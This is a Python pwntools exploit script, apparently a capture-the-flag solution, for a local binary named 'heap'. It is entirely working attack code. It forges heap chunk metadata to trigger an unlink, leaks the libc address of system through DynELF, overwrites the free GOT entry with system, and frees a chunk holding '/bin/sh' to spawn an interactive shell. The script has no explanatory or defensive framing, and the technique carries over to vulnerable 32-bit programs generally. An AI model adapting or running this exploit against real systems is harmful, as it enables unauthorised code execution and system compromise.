from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

chunk_list = 0x8049d60

p = remote("127.0.0.1", 4000)
#p = process('heap')

def add_chunk(len):
	print p.recvuntil('\n')
	p.sendline('1')
	print p.recvuntil('Input the size of chunk you want to add:')
	p.sendline(str(len))

def set_chunk(index, data):
	p.recvuntil('5.Exit\n')
	p.sendline('2')
	p.recvuntil('Set chunk index:')
	p.sendline(str(index))
	p.recvuntil('Set chunk data:')
	p.sendline(data)

def set_chunk2(index, data):
	p.sendline('2')
	p.recvuntil('Set chunk index:')
	p.sendline(str(index))
	p.recvuntil('Set chunk data:')
	p.sendline(data)

def del_chunk(index):
	p.recvline('\n')
	p.sendline('3')
	p.recvuntil('Delete chunk index:')
	p.sendline(str(index))

def print_chunk(index):
	p.sendline('4')
	p.recvuntil('Print chunk index:')
	p.sendline(str(index))
	res = p.recvuntil('5.Exit\n')
	return res

flag = 0
def leak(addr):
	data = 'a' * 0xc + p32(chunk_list-0xc) + p32(addr)
	global flag
	if flag == 0:
		set_chunk(0, data)
		flag = 1
	else:
		set_chunk2(0, data)
	p.recvuntil('5.Exit\n')
	res = print_chunk(1)
	print("leaking: %#x ---> %s" % (addr, res[0:4].encode('hex')))
	#input('123')
	return res[0:4]

add_chunk(128)
add_chunk(128)
add_chunk(128)
add_chunk(128)
set_chunk(3, '/bin/sh\x00')

payload = ""
payload += p32(0) + p32(0x80) + p32(chunk_list-0xc) + p32(chunk_list-0x8)
payload += 'a'*(0x80-16)

payload += p32(0x80) + p32(0x88)

set_chunk(0, payload)

#gdb.attach(p)

del_chunk(1)

raw_input('leak')
#leak system_addr
pwn_elf = ELF('./heap')
d = DynELF(leak, elf=pwn_elf)
sys_addr = d.lookup('system', 'libc')
print("system addr: %#x" % sys_addr)

free_got = pwn_elf.got['free']
payload = 'a' * 0xc + p32(chunk_list-0xc) + p32(free_got)
set_chunk2(0, payload)

set_chunk(1, p32(sys_addr))

input("#")

del_chunk(3)

p.interactive()
